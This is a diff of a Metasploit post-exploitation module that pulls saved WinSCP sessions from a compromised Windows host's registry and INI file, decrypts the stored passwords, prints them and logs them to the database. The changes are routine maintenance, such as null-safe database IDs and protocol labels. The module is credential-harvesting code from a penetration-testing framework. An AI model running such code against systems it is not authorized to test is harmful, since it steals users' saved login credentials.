@@ -1,14 +1,10 @@
-##
-# $Id$
-##
-
 # post/windows/gather/enum_vnc_pw.rb
 
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -16,6 +12,7 @@ require 'rex'
 require 'msf/core/post/windows/registry'
 require 'rex/parser/ini'
 require 'msf/core/post/windows/user_profiles'
+require 'msf/core/auxiliary/report'
 
 class Metasploit3 < Msf::Post
 	include Msf::Post::Windows::Registry
@@ -25,7 +22,6 @@ class Metasploit3 < Msf::Post
 	def initialize(info={})
 		super(update_info(info,
 			'Name'          => 'Windows Gather WinSCP Saved Password Extraction',
-			'Version'       => '$Revision$',
 			'Description'   => %q{
 				This module extracts weakly encrypted saved passwords from
 				WinSCP. It searches for saved sessions in the Windows Registry
@@ -33,8 +29,8 @@ class Metasploit3 < Msf::Post
 				password is used.
 				},
 			'License'       => MSF_LICENSE,
-			'Author'        => [ 'TheLightCosine <thelightcosine[at]gmail.com>'],
-			'Platform'      => [ 'windows' ],
+			'Author'        => [ 'theLightCosine'],
+			'Platform'      => [ 'win' ],
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
 	end
@@ -87,7 +83,7 @@ class Metasploit3 < Msf::Post
 					# If no explicit protocol entry exists it is on sFTP with SCP backup. If it is 0
 					# it is set to SCP.
 					if proto == nil or proto == 0
-						proto = "SCP"
+						proto = "SSH"
 					else
 						proto = "FTP"
 					end
@@ -95,11 +91,16 @@ class Metasploit3 < Msf::Post
 					#Decrypt our password, and report on results
 					pass= decrypt_password(password, user+host)
 					print_status("Host: #{host}  Port: #{portnum} Protocol: #{proto}  Username: #{user}  Password: #{pass}")
+					if session.db_record
+						source_id = session.db_record.id
+					else
+						source_id = nil
+					end
 					report_auth_info(
 						:host  => host,
 						:port => portnum,
 						:sname => proto,
-						:source_id => session.db_record.id,
+						:source_id => source_id,
 						:source_type => "exploit",
 						:user => user,
 						:pass => pass
@@ -155,18 +156,23 @@ class Metasploit3 < Msf::Post
 						# If no explicit protocol entry exists it is on sFTP with SCP backup. If it
 						# is 0 it is set to SCP.
 						if proto == nil or proto == 0
-							proto = "SCP"
+							proto = "SSH"
 						else
 							proto = "FTP"
 						end
 						# Decrypt the password and report on all of the results
 						pass= decrypt_password(ini[group]['Password'], user+host)
 						print_status("Host: #{host}  Port: #{portnum} Protocol: #{proto}  Username: #{user}  Password: #{pass}")
+						if session.db_record
+							source_id = session.db_record.id
+						else
+							source_id = nil
+						end
 						report_auth_info(
 							:host  => host,
 							:port => portnum,
 							:sname => proto,
-							:source_id => session.db_record.id,
+							:source_id => source_id,
 							:source_type => "exploit",
 							:user => user,
 							:pass => pass
